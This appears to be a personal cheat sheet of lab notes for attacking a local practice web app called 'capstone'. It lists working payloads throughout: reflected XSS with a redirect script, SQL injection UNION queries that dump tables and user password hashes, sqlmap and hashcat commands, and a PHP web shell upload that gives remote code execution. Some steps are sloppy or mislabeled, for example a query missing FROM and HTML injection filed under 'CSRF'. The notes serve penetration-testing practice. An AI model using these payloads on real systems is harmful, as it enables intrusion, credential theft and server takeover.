# Recon / Know App / Test default and easy credentials etc. 

# Enumaration with dirbuster: 
  dirbuster -u 'http://localhost/capstone/index.php' -w /usr/share/wordlists/dirb/common.txt 

# Explore directory > localhost/capstone/admin/admin.php > index.php?message=Admins only!
# Try some other juicy directory

# CSRF
  Try passing html, script from an url message section 
  http://localhost/capstone/index.php?message=message=<h1>XSS</h1>
  
# XSS
  <script>alert(1)</script>to the message section 
  http://localhost/capstone/index.php?message=message=<script>alert(1)</script>
  
  # Can redirect to any other link 
  localhost/capstone/index.php?message=<script>window.location.href = "https://lalbudha.com.np";</script>
  
# Try enumarating with which sometimes show info issues. 
  http://localhost/capstone/coffee.php?coffee=1' or 1 = 1# | This means select everything from coffee with id=1 and comment all
  localhost/capstone/coffee.php?coffe=1' or 1=1 -- | Try with id=1' or 1=1 -- | Little different way
  
# We can FFuF the total id list 
  generate 1 to 100 number list for FUZZ for id no.
  python3 -c 'for i in range(1,101): print(i)'  > num.txt
  ffuf -u 'http://localhost/directory/coffee.php?coffee=FUZZ' -w num.txt
  ffuf -u 'http://localhost/directory/coffee.php?coffee=FUZZ' -w num.txt -fs 6566 (size) - which give the id hint
  
# SQL Injection
  localhost/capstone/coffee.php?coffee=1' union select null, null, null - - - | Gives info issue
  localhost/capstone/coffee.php?coffee=1' union select null, null, null, null, null, null, null-- - | Try diff way
  localhost/capstone/coffee.php?coffee=1' union select null, 'string', 'string', null, null, null, null-- - | Try adding string for testing where the tables, columns names contains (* Make sure you are not logged in)
  
  #Finding Tables and Columns using union select and information_schema
  localhost/capstone/coffee.php?coffee=1' union select null, Table_name , null, null, null, null, null from information_schema.tables-- - | It list all the tables of db
  localhost/capstone/coffee.php?coffee=1' union select null, null , null, Column_name, null, null, null from information_schema.columns-- - | It list all the tables of db
  localhost/capstone/coffee.php?coffee=1' union select null, username , password, null, null, null, null users-- - | Which displays usernames with crossponding passwords in hashed and we need to crack
  
  # Now Cracking With SQL-MAP
  # Using HashCat to see which hashing password mode is used. 
  1. Copy all the hashes and then find > then select mode > "https://hashcat.net/wiki/doku.php?id=example_hashes"
     Eg: hashcat -m 3200 my-hash /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt | --show (to show psw cracked) 
     
   2. If we know the tables then we can dump and find users, passwords with has etc with sqlmap
      Eg: Copy the get request from burpsuite > make a file > then dump with the command "sqlmap -r test-coffee.txt -T users --dump"
     
   3. Now we got the admin user and password 
   Then upload files from admin page and use repeater to fdw traffic while adding our malicious script 
   The basic script is <? php system($_GET['cmd']); ?>
   Go to the browser and try to access with > /localhost/directory/script.php > /localhost/directory/script.php?whoami;
   Now its gonna show www-data and it proves we have now remote code execution acccess. 
  

  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
   


